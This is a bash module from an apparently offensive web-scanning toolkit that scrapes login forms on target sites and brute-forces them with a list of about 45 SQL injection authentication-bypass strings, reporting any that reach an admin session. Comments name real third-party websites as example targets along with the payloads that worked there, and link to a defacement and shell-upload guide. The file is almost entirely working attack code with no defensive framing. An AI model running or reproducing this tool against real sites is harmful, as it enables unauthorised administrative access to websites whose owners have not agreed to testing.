#!/bin/bash

	#	//	<<uriel-admin-login-backup>>
	#	//	type		: <<tools>>
	#	//	severity	: <<high>>
	#	//	tags		: <<sqli>> <<exploit>>
	#	//	author		: RavenC4
	#	//	series		: IX
	#	//	description	: Explore all subdomains to find some bugs.
    #   //  requirement : result of "subdomain-enum" module (or: result/subdomain-enum.art)
	#	//	reference	: https://github.com/Zusyaku/Deface-And-Dorking/blob/main/Cara%20Deface%20Mentode%20Bypass%20SQL%20Login%20%2B%20UP%20Shell


# Example: https://www.bcipl.net/admin-login.php | '=''or'
#			https://alumniagcshaldia.org/admin-login.php | 'or''='
#			https://parokitidarmalang.org/warungumat/admin/admin_login.php | 'or''='@gmail.com

#		heat-admin/login.php

# xargs -P 20 -I{} bash -c 'if [[ `nslookup "{}" | grep "NXDOMAIN"` ]]; then RES=FALSE;else echo -e " \033[3;36m info   \033[0;32m subdomain-enum\033[0;37m {}";echo -e " \"{}\"," >> result/subdomain-enum.json; fi' < cache.txt

URIEL_ADMIN_LOGIN_DATA="cache/uriel_admin_login.txt"

curl -ks "$WEBSITE" | grep -io 'action=['"'"'"][^"'"'"']*['"'"'"]' | sed -e 's/^action=["'"'"']//i' -e 's/["'"'"']$//i' | head -1 > "$URIEL_ADMIN_LOGIN_DATA"

if [[ ! -s "$URIEL_ADMIN_LOGIN_DATA" ]];
then
	RES="FALSE"
else
	echo -e " \033[3;36m info   \033[0;32m uriel-admin-login\033[0;37m Form login found: $WEBSITE, action: `cat $URIEL_ADMIN_LOGIN_DATA`"

	# if [[ `basename "$WEBSITE"` = "$DOMAIN_NAME" ]];
	# then

	# URIEL_ADMIN_LOGIN_URI=`echo -e "$WEBSITE" | rev | cut -d "/" -f2-10 | rev`
	

	#	Dumping username fields
	curl --silent "$WEBSITE" | grep 'input'| grep "type"| grep -E "user|User|USER" | grep -io 'name=['"'"'"][^"'"'"']*['"'"'"]' | sed -e 's/^name=["'"'"']//i' -e 's/["'"'"']$//i' | head -1 > cache/uriel_admin_uname.txt
	echo -e " \033[3;36m info   \033[0;32m uriel-admin-login\033[0;37m Form login found: $WEBSITE, input name: `cat cache/uriel_admin_uname.txt`"

	#	Dumping email fields if username = 0
	if [[ ! -s "cache/uriel_admin_uname.txt" ]];
	then
		curl --silent "$WEBSITE" | grep 'input'| grep "type"| grep -E "email|Email" | grep -io 'name=['"'"'"][^"'"'"']*['"'"'"]' | sed -e 's/^name=["'"'"']//i' -e 's/["'"'"']$//i' | head -1 > cache/uriel_admin_uname.txt
		echo -e " \033[3;36m info   \033[0;32m uriel-admin-login\033[0;37m Form login found: $WEBSITE, email: `cat cache/uriel_admin_uname.txt`"
	fi

	#	Dumping password fields
	curl --silent "$WEBSITE" | grep 'input'| grep "type"| grep -E "pass|password" | grep -io 'name=['"'"'"][^"'"'"']*['"'"'"]' | sed -e 's/^name=["'"'"']//i' -e 's/["'"'"']$//i' | head -1 > cache/uriel_admin_passwd.txt
	echo -e " \033[3;36m info   \033[0;32m uriel-admin-login\033[0;37m Form login found: $WEBSITE, input name: `cat cache/uriel_admin_passwd.txt`"

	curl --silent "$WEBSITE" | grep 'submit'| grep -E "Login|login|LogIn|LOGIN" | grep -io 'name=['"'"'"][^"'"'"']*['"'"'"]' | sed -e 's/^name=["'"'"']//i' -e 's/["'"'"']$//i' | head -1 > cache/uriel_admin_submit.txt
	echo -e " \033[3;36m info   \033[0;32m uriel-admin-login\033[0;37m Form login found: $WEBSITE, submiter: `cat cache/uriel_admin_submit.txt`"


	if [[ ! -s "cache/uriel_admin_submit.txt" ]];
	then
		curl --silent "$WEBSITE" | grep 'submit'| grep -E "Login|login|LogIn|LOGIN" | grep -io 'value=['"'"'"][^"'"'"']*['"'"'"]' | sed -e 's/^value=["'"'"']//i' -e 's/["'"'"']$//i' | head -1 > cache/uriel_admin_submit.txt
		echo -e " \033[3;36m info   \033[0;32m uriel-admin-login\033[0;37m Form login found: $WEBSITE, submiter: `cat cache/uriel_admin_submit.txt`"
	fi

	if [[ ! -s "cache/uriel_admin_submit.txt" ]];
	then
		echo -e "submit" > cache/uriel_admin_submit.txt
		echo -e " \033[3;36m info   \033[0;32m uriel-admin-login\033[0;37m Form login found: $WEBSITE, setting submiter: `cat cache/uriel_admin_submit.txt`"

	fi

fi

	if [[ `cat "$URIEL_ADMIN_LOGIN_DATA" | grep "//"` ]];
	then
		URIEL_ADMIN_LOGIN_URL=`cat $URIEL_ADMIN_LOGIN_DATA`
	elif [[ `cat "$URIEL_ADMIN_LOGIN_DATA" | grep "#"` ]];
	then
		URIEL_ADMIN_LOGIN_URL=$WEBSITE
	elif [[ `cat "$URIEL_ADMIN_LOGIN_DATA" | grep -E ".php|login|verify|/"` ]];
	then
		URIEL_ADMIN_LOGIN_URI=`echo -e "$WEBSITE" | rev | cut -d "/" -f2-10 | rev`
		URIEL_ADMIN_LOGIN_URL="$URIEL_ADMIN_LOGIN_URI/`cat $URIEL_ADMIN_LOGIN_DATA`"
	else
		URIEL_ADMIN_LOGIN_URL=$WEBSITE
	fi

	URIEL_ADMIN_LOGIN_UNAME=`cat cache/uriel_admin_uname.txt`
	URIEL_ADMIN_LOGIN_PASSWD=`cat cache/uriel_admin_passwd.txt`
	URIEL_ADMIN_LOGIN_SUBMIT=`cat cache/uriel_admin_submit.txt`

AUTH=(
	"admin"
	"Admin"
	"admin@gmail.com"
	"test"
	"test@gmail.com"
	"'or''='@gmail.com"
	"'"
	"'or''='"
	"'=''or'"
	"or 1=1 "
	"or 1=1-- "
	"or 1=1# "
	"or 1=1/* "
	"admin '#"
	"admin' or '1' = '1"
	"admin' or '1' = '1' #"
	"admin 'or 1 = 1 or' '='"
	"'or 1 = 1 limit 1 -- +"
	"' or 1=1 limit 1 -- -+"
	"' or 1=1--"
	"' or '1' = '1"
	"' or 'x' = 'x"
	"' or 0 = 0 -"
	"admin' -- "
	"admin' # "
	"admin'/* "
	"admin' or '1'='1 "
	"admin' or '1'='1'-- "
	"admin' or '1'='1'# "
	"admin' or '1'='1'/* "
	"admin'or 1=1 or ''=' "
	"admin' or 1=1 "
	"admin' or 1=1-- "
	"admin' or 1=1# "
	"admin' or 1=1/* "
	"admin') or ('1'='1 "
	"admin') or ('1'='1'-- "
	"admin') or ('1'='1'# "
	"admin') or ('1'='1'/* "
	"admin') or '1'='1 "
	"admin') or '1'='1'-- "
	"admin') or '1'='1'# "
	"admin') or '1'='1'/* "
	)

for creds in ${AUTH[@]}; do
	if [[ `curl -k --silent --location -X POST -d "${URIEL_ADMIN_LOGIN_UNAME}=${creds}&${URIEL_ADMIN_LOGIN_PASSWD}=${creds}&${URIEL_ADMIN_LOGIN_SUBMIT}=true" "${URIEL_ADMIN_LOGIN_URL}" | grep -E "logout|Logout|LOGOUT|success|Success|SUCCESS"` ]];
	then
		#echo -e "$WEBSITE | $creds"
		echo -e "$creds" > cache/uriel_admin_success.txt
		 echo -e " \033[3;31m high   \033[0;32m uriel-admin-login\033[0;37m $URIEL_ADMIN_LOGIN_URL, user & password:${GREEN} `cat cache/uriel_admin_success.txt` $NORM"
	fi
done
#curl -k --location -X POST -d "uname='or''='&pass='or''='&login=true" http://testphp.vulnweb.com/userinfo.php | grep -w "logout"


# curl -k http://testphp.vulnweb.com/login.php | grep -io 'action=['"'"'"][^"'"'"']*['"'"'"]' | sed -e 's/^action=["'"'"']//i' -e 's/["'"'"']$//i' | head -1


# curl -k http://testphp.vulnweb.com/login.php | grep -io '<form action=['"'"'"][^"'"'"']*['"'"'"]'


# curl -k http://testphp.vulnweb.com/login.php | grep -io '<a href=['"'"'"][^"'"'"']*['"'"'"]' | sed -e 's/^<a href=["'"'"']//i' -e 's/["'"'"']$//i'


# curl https://kgpraigarh.ac.in/adminlogin.php | grep -io 'input ['"'"'"][^"'"'"']*['"'"'"]'


# curl https://kgpraigarh.ac.in/adminlogin.php | grep 'input'| grep "placeholder"| grep -E "user|User" | grep -io 'name=['"'"'"][^"'"'"']*['"'"'"]' | sed -e 's/^name=["'"'"']//i' -e 's/["'"'"']$//i' | head -1





#curl -k --silent --location -X POST -d "username='=''or'&password='=''or'&save=true" https://alumniagcshaldia.org/admin-login.php
